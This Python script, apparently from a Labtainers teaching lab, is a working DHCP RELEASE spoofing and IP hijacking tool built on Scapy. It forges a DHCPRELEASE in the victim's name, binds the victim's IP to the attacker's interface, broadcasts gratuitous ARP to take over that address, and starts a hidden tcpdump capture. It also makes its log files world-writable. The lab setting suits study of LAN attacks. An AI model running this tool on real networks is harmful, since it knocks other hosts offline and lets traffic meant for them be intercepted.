#!/usr/bin/env python3
"""
DHCP RELEASE Spoofing & IP Hijacking Tool
Labtainers Cyber Security Laboratory

Features:
1. Release Attacker's current dynamic IP address.
2. Send spoofed DHCPRELEASE packet impersonating Client to DHCP Server.
3. Hijack Client's IP, assign it to local interface, and broadcast Gratuitous ARP.
4. Notify success and exit cleanly so the student can use network monitoring tools.
"""

import sys
import os
import time
import random
import subprocess
from scapy.all import *

RESULT_LOGS = ["/var/log/attack.log", "/home/ubuntu/.local/result/attack.log"]
TRAFFIC_LOG = "/var/log/traffic.log"

def log_event(filenames, msg):
    if isinstance(filenames, str):
        filenames = [filenames]
    for filename in filenames:
        try:
            os.makedirs(os.path.dirname(filename), exist_ok=True)
            with open(filename, "a") as f:
                f.write(msg + "\n")
            os.system(f"chmod 666 {filename} 2>/dev/null")
        except:
            pass

def get_current_ip(iface):
    try:
        out = subprocess.check_output(f"ip -4 addr show {iface}", shell=True).decode()
        for line in out.splitlines():
            line = line.strip()
            if line.startswith("inet "):
                return line.split()[1].split("/")[0]
    except Exception:
        pass
    return None

def get_required_input(prompt_text):
    while True:
        value = input(prompt_text).strip()
        if value:
            return value
        print("[-] Error: Input cannot be empty. Please enter a valid value.")

def send_spoofed_release(iface, server_ip, victim_ip, victim_mac):
    mac_bytes = bytes.fromhex(victim_mac.replace(":", ""))
    xid = random.randint(1, 999999)

    release_pkt = (
        Ether(dst="ff:ff:ff:ff:ff:ff", src=victim_mac) /
        IP(src=victim_ip, dst=server_ip) /
        UDP(sport=68, dport=67) /
        BOOTP(chaddr=mac_bytes, ciaddr=victim_ip, xid=xid) /
        DHCP(options=[
            ("message-type", "release"),
            ("server_id", server_ip),
            "end"
        ])
    )
    sendp(release_pkt, iface=iface, verbose=0)
    print(f"[+] Spoofed DHCPRELEASE packet sent for victim IP {victim_ip} (MAC: {victim_mac})")

def main():
    print("=" * 65)
    print("  DHCP RELEASE SPOOFING & IP HIJACKING TOOL (Scapy)")
    print("=" * 65)

    iface = get_required_input("Enter network interface (e.g., eth0): ")
    server_ip = get_required_input("Enter DHCP Server IP address (e.g., 192.168.0.100): ")
    victim_ip = get_required_input("Enter Victim Client IP address (e.g., 10.10.0.100): ")
    victim_mac = get_required_input("Enter Victim Client MAC address (e.g., 02:42:0a:0a:00:32): ")

    print("\n" + "-" * 50)
    print("[STEP 1] Releasing Attacker's current dynamic IP address...")
    attacker_old_ip = get_current_ip(iface)
    if attacker_old_ip:
        print(f"[*] Attacker currently has IP: {attacker_old_ip}. Releasing lease...")
        os.system(f"dhclient -r {iface} 2>/dev/null")
        os.system(f"ip -4 addr flush dev {iface} 2>/dev/null")
        time.sleep(1)
        print(f"[+] Successfully released IP {attacker_old_ip}")
    else:
        print("[*] Interface has no current IP address, proceeding...")

    print("\n" + "-" * 50)
    print(f"[STEP 2] Sending spoofed DHCPRELEASE to revoke Client lease on DHCP Server...")
    send_spoofed_release(iface, server_ip, victim_ip, victim_mac)
    time.sleep(1)

    print("\n" + "-" * 50)
    print(f"[STEP 3] Hijacking victim IP {victim_ip} and binding to interface {iface}...")
    os.system(f"ip addr add {victim_ip}/24 dev {iface}")
    os.system(f"ip link set {iface} up")
    os.system(f"ip route add default via 10.10.0.1 dev {iface} 2>/dev/null")

    # Broadcast Gratuitous ARP to update ARP caches in the entire network
    attacker_mac = get_if_hwaddr(iface)
    arp_pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src=attacker_mac) / ARP(
        op=2, hwsrc=attacker_mac, psrc=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", pdst=victim_ip
    )
    sendp(arp_pkt, iface=iface, count=3, verbose=0)
    print(f"[+] Assigned IP {victim_ip} to Attacker interface ({attacker_mac})")
    print(f"[+] Broadcast Gratuitous ARP announcing new IP ownership across the network")

    log_event(RESULT_LOGS, f"HIJACK_SUCCESS: IP={victim_ip} MAC={attacker_mac}")

    # Ensure background capture logs traffic from DHCP Server
    os.system(f"nohup tcpdump -i {iface} -n -l 'src {server_ip}' >> {TRAFFIC_LOG} 2>&1 &")

    print("\n" + "=" * 65)
    print(f"[+] SUCCESS: Successfully hijacked Client IP {victim_ip}!")
    print(f"[+] IP {victim_ip} is now active on Attacker interface ({iface}).")
    print("[+] Attack script completed. Exiting.")
    print("=" * 65)

if __name__ == "__main__":
    main()
